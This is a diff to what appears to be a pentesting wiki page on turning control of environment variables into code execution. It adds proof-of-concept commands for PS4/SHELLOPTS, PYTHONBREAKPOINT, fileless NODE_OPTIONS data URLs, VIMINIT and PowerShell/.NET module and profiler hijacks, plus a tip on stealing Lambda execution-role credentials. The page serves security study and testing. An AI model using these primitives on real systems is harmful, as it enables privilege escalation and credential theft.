@@ -211,7 +211,24 @@ BASH_ENV=/tmp/pre.sh bash -c 'echo target'
 
 Bash ignores these startup files when the **real/effective IDs differ**; `-p` preserves the effective ID but does not enable those startup files, so the exact behavior depends on how the wrapper invokes the shell. Be careful with privileged wrappers that call `setuid()`/`setgid()` **before** launching Bash: once the IDs match again, Bash may trust `BASH_ENV`, `ENV`, and related shell state that would otherwise be ignored.<sup>[[1]](#references)</sup>
 
-### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**
+### **PS4 + SHELLOPTS (xtrace)**
+
+When Bash runs with **xtrace** enabled it expands `PS4` and prints it before every traced command. `PS4` is expanded like a prompt, so a **command substitution** inside it is executed. Crucially, xtrace itself can be turned on purely from the environment by exporting `SHELLOPTS=xtrace` — no `-x` on the command line is needed — so any Bash script the victim runs becomes code execution.<sup>[[7]](#references)</sup>
+
+```bash
+echo 'echo target' > /tmp/victim.sh
+
+# Pure environment-variable injection (no -x flag)
+SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
+cat /tmp/ps4-executed
+
+# Same primitive when a job is run with debugging enabled
+PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
+```
+
+`PS4` does nothing until xtrace is active (`SHELLOPTS=xtrace`, `set -x` or `bash -x`), and Bash drops `SHELLOPTS` in privileged/setuid contexts just like `BASH_ENV`.
+
+### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**
 
 These variables change how Python starts:
 
@@ -219,6 +236,7 @@ These variables change how Python starts:
 - `PYTHONHOME`: relocate the standard library tree.
 - `PYTHONSTARTUP`: execute a file before the interactive prompt.
 - `PYTHONINSPECT=1`: drop into interactive mode after a script finishes.
+- `PYTHONBREAKPOINT`: `package.module.callable` invoked (and its module imported) when the code reaches `breakpoint()`.<sup>[[8]](#references)</sup>
 
 They are useful against maintenance scripts, debuggers, shells, and wrappers that call Python with a controllable environment. `python -E` and `python -I` ignore all `PYTHON*` variables.
 
@@ -227,6 +245,10 @@ mkdir -p /tmp/pylib
 printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
 PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
 PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
+
+# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
+printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
+PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
 ```
 
 A recent real-world example was the 2024 **needrestart** LPE on Ubuntu/Debian systems: the root-owned scanner copied an unprivileged process's `PYTHONPATH` from `/proc/<PID>/environ` and then executed Python. The published exploit planted `importlib/__init__.so` in the attacker-controlled path so Python executed attacker code during its own initialization, before the helper's hard-coded script even mattered.<sup>[[3]](#references)</sup>
@@ -266,6 +288,27 @@ EOF
 NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
 ```
 
+#### Fileless preload with a `data:` URL
+
+When you can set `NODE_OPTIONS` but **cannot write a file** on the target (read-only filesystem, restricted API, serverless runtime, etc.), `--import` accepts a `data:text/javascript,` URL, so the whole payload travels inside the environment variable itself. The JavaScript must be **fully URL-encoded** — Node parses the value as a URL, so any raw space (or other unencoded char) truncates the payload and throws a `SyntaxError`. This works on Node 20.6+ where `--import` is on the `NODE_OPTIONS` allowlist.<sup>[[4]](#references)</sup>
+
+```bash
+# fileless proof of execution (note: no raw spaces in the data URL)
+NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'
+
+# Real payload, URL-encoded (run a command / exfiltrate env vars)
+PAYLOAD=$(python3 - <<'PY'
+import urllib.parse
+js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
+print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
+PY
+)
+NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
+```
+
+> [!TIP]
+> This is a common way to turn `NODE_OPTIONS` control into RCE on **managed cloud runtimes** whose functions run Node. For example, an attacker who can only change a Lambda's configuration (`lambda:UpdateFunctionConfiguration`, no `iam:PassRole`, no code update) can inject `NODE_OPTIONS=--import data:text/javascript,<payload>` to run code inside the function and steal its execution-role credentials. The injected module runs **before** the handler, which still executes normally afterwards.
+
 For remote gadget chains that set `NODE_OPTIONS` indirectly (for example, prototype-pollution to RCE), check [this other page](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).
 
 ### **RUBYLIB & RUBYOPT**
@@ -282,6 +325,42 @@ RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
 ```
 
 The 2024 **needrestart** vulnerabilities showed that this is not just a lab trick: the same root-owned helper that was vulnerable to `PYTHONPATH` abuse could also be coerced into running Ruby with an attacker-controlled `RUBYLIB`, loading `enc/encdb.so` from an attacker directory.<sup>[[3]](#references)</sup>
+
+### **VIMINIT & EXINIT**
+
+Vim/Neovim execute the Ex commands contained in `VIMINIT` (or its `EXINIT` fallback) during a normal startup. Ex commands include `:!cmd` and `:call system(...)`, so controlling the variable yields code execution whenever a victim opens Vim (a root `sudo vim`, `crontab -e`, `visudo`, `git`/`less` spawning `$EDITOR`, etc.).<sup>[[9]](#references)</sup>
+
+```bash
+echo hi > /tmp/victim.txt
+printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
+test -e /tmp/vim-executed && echo 'VIMINIT executed'
+```
+
+Batch mode (`vim -es`/`-Es`) skips these variables, but a normal interactive startup runs them.
+
+### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**
+
+PowerShell Core (`pwsh`) runs on Linux/macOS (and Windows) and is a **.NET application**, so several environment variables turn any `pwsh` invocation with an inherited environment into code execution — useful against cron/systemd jobs, CI runners and privileged wrappers that shell out to `pwsh`.
+
+- `PSModulePath`: PowerShell recursively searches every directory in this list for `.psd1`/`.psm1` modules and **auto-loads** one the first time a command it exports is referenced. Prepend a directory and your module's top-level code runs at import time; because resolution is *Alias → Function → Cmdlet*, an exported function can even shadow a built-in cmdlet the victim calls.<sup>[[10]](#references)</sup>
+- `XDG_CONFIG_HOME`: relocates `powershell/Microsoft.PowerShell_profile.ps1`, executed at startup (unless `-NoProfile`).
+- `DOTNET_STARTUP_HOOKS`: managed assembly whose `StartupHook.Initialize()` runs before `Main` (shared by every .NET app).
+- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: the CLR profiling API loads an attacker library into the process at startup (path vars beat the registry; `DOTNET_*` is the newer alias). On Windows PowerShell 5.1 (.NET Framework) use `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
+
+```bash
+# PSModulePath module auto-load hijack
+mkdir -p /tmp/evil/Hijack
+printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
+printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
+PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
+test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
+```
+
+On Windows, `PSExecutionPolicyPreference=Bypass` additionally removes the "unsigned scripts blocked" guardrail so a planted profile/module actually runs. See the dedicated page for full PoCs:
+
+{{#ref}}
+../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
+{{#endref}}
 
 ### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**
 
@@ -344,5 +423,10 @@ One background job, one stopped and last command didn't finish correctly:
 - [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
 - [5] [Common environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
 - [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation in the glibc's ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
+- [7] [GNU Bash Manual - Bash Variables (`PS4`) & The Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
+- [8] [PEP 553 - Built-in breakpoint() and PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
+- [9] [Vim documentation - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
+- [10] [about_PSModulePath & PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
+- [11] [.NET debugging & profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
 
 {{#include ../../banners/hacktricks-training.md}}
